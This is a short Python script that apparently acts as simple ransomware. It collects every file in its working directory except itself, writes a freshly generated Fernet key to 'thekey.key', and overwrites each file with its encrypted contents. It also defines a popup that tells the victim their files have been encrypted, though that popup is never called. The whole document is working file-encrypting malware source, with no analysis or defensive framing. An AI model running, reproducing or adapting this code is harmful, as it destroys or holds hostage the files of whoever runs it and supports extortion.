import os
import cryptography
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

def show_warning():
    
    root = tk.Tk()
    root.withdraw()
    
    
    messagebox.showwarning(
        "execution Complete",
        "your computer has been corrupted. Your files have been encrypted. "
        "remain calm."
    )

files = []

for file in os.listdir():
        if file == "prxnked.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


key = Fernet.generate_key()


with open("thekey.key", "wb") as thekey:
        thekey.write(key)


for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted  = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
